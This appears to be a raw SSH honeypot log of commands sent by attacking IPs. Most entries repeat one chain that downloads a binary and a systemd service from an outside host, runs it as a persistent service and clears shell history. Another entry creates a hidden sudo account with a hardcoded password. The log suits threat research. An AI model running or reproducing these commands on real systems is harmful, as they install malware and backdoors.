start
2024-11-29 13:38:22.624085 - ('45.148.10.46', 34400) - apt
2024-11-29 13:38:24.513914 - ('45.148.10.46', 34400) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:39:23.308439 - ('45.148.10.46', 39440) - apt
2024-11-29 13:39:25.708219 - ('45.148.10.46', 39440) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:40:00.140489 - ('45.148.10.46', 51952) - apt
2024-11-29 13:40:02.407192 - ('45.148.10.46', 51952) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:40:19.314676 - ('45.148.10.46', 46252) - apt
2024-11-29 13:40:20.711355 - ('45.148.10.46', 46252) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:40:37.608334 - ('45.148.10.46', 51536) - apt
2024-11-29 13:40:41.506676 - ('45.148.10.46', 51536) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:41:01.109839 - ('45.148.10.46', 46006) - apt
2024-11-29 13:41:04.919154 - ('45.148.10.46', 46006) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:41:26.414568 - ('45.148.10.46', 38000) - apt
2024-11-29 13:41:29.512447 - ('45.148.10.46', 38000) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:41:50.609398 - ('45.148.10.46', 39884) - apt
2024-11-29 13:41:55.217494 - ('45.148.10.46', 39884) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:42:16.708194 - ('45.148.10.46', 53078) - apt
2024-11-29 13:42:21.909585 - ('45.148.10.46', 53078) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:42:36.011442 - ('45.148.10.46', 47526) - apt
2024-11-29 13:42:37.508606 - ('45.148.10.46', 47526) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:42:54.413733 - ('45.148.10.46', 48888) - apt
2024-11-29 13:42:58.106800 - ('45.148.10.46', 48888) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:44:10.219195 - ('45.148.10.46', 48018) - apt
2024-11-29 13:44:13.812777 - ('45.148.10.46', 48018) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:44:37.313181 - ('45.148.10.46', 59418) - apt
2024-11-29 13:44:41.809225 - ('45.148.10.46', 59418) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:45:03.712178 - ('45.148.10.46', 46678) - apt
2024-11-29 13:45:07.710254 - ('45.148.10.46', 46678) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:45:30.111956 - ('45.148.10.46', 42768) - apt
2024-11-29 13:45:35.509389 - ('45.148.10.46', 42768) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:46:34.410040 - ('45.148.10.46', 49218) - apt
2024-11-29 13:46:39.608585 - ('45.148.10.46', 49218) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:47:43.611716 - ('45.148.10.46', 49452) - apt
2024-11-29 13:47:49.509303 - ('45.148.10.46', 49452) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:48:16.708466 - ('45.148.10.46', 46806) - apt
2024-11-29 13:48:22.008992 - ('45.148.10.46', 46806) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:48:48.714916 - ('45.148.10.46', 59940) - apt
2024-11-29 13:48:55.610545 - ('45.148.10.46', 59940) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:49:23.414563 - ('45.148.10.46', 34278) - apt
2024-11-29 13:49:29.319529 - ('45.148.10.46', 34278) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:49:57.223874 - ('45.148.10.46', 43236) - apt
2024-11-29 13:50:03.307176 - ('45.148.10.46', 43236) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:50:31.407605 - ('45.148.10.46', 35116) - apt
2024-11-29 13:50:37.111506 - ('45.148.10.46', 35116) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 13:54:58.690012 - ('92.255.57.132', 48008) - echo 'SSH check'
2024-11-29 14:52:56.526780 - ('92.255.57.132', 42438) - echo 'SSH check'
2024-11-29 15:50:27.819736 - ('92.255.57.132', 40768) - echo 'SSH check'
2024-11-29 16:43:01.161400 - ('46.19.143.66', 57960) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 ZSWmG5fG) system && sudo usermod -aG sudo system
2024-11-29 16:43:01.712495 - ('46.19.143.66', 57960) - lscpu && echo -e "ZSWmG5fG\nZSWmG5fG" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-29 16:48:10.313960 - ('92.255.57.132', 34740) - echo 'SSH check'
2024-11-29 17:45:36.939701 - ('92.255.57.132', 47148) - echo 'SSH check'
2024-11-29 18:43:21.383924 - ('92.255.57.132', 54538) - echo 'SSH check'
2024-11-29 19:06:22.067951 - ('45.148.10.203', 43222) - apt
2024-11-29 19:06:22.599949 - ('45.148.10.203', 43222) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:06:28.313958 - ('45.148.10.203', 49742) - apt
2024-11-29 19:06:29.130206 - ('45.148.10.203', 49742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:06:35.052775 - ('45.148.10.203', 59724) - apt
2024-11-29 19:06:35.507405 - ('45.148.10.203', 59724) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:06:41.203369 - ('45.148.10.203', 59730) - apt
2024-11-29 19:06:42.167378 - ('45.148.10.203', 59730) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:06:48.111275 - ('45.148.10.203', 58822) - apt
2024-11-29 19:06:48.535032 - ('45.148.10.203', 58822) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:06:54.333951 - ('45.148.10.203', 58866) - apt
2024-11-29 19:06:55.273711 - ('45.148.10.203', 58866) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:01.447673 - ('45.148.10.203', 33098) - apt
2024-11-29 19:07:01.907296 - ('45.148.10.203', 33098) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:07.761079 - ('45.148.10.203', 39554) - apt
2024-11-29 19:07:08.771017 - ('45.148.10.203', 39554) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:14.675162 - ('45.148.10.203', 51690) - apt
2024-11-29 19:07:15.166326 - ('45.148.10.203', 51690) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:20.999257 - ('45.148.10.203', 51696) - apt
2024-11-29 19:07:21.860683 - ('45.148.10.203', 51696) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:29.007038 - ('45.148.10.203', 35468) - apt
2024-11-29 19:07:29.799183 - ('45.148.10.203', 35468) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:35.610535 - ('45.148.10.203', 53528) - apt
2024-11-29 19:07:36.134838 - ('45.148.10.203', 53528) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:42.028293 - ('45.148.10.203', 53556) - apt
2024-11-29 19:07:43.066040 - ('45.148.10.203', 53556) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:48.889852 - ('45.148.10.203', 58818) - apt
2024-11-29 19:07:49.413833 - ('45.148.10.203', 58818) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:07:58.060298 - ('45.148.10.203', 34708) - apt
2024-11-29 19:07:58.501017 - ('45.148.10.203', 34708) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-29 19:08:08.029822 - ('45.148.10.203', 34730) - apt
2024-11-29 19:08:08.533946 - ('45.148.10.203', 34730) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c
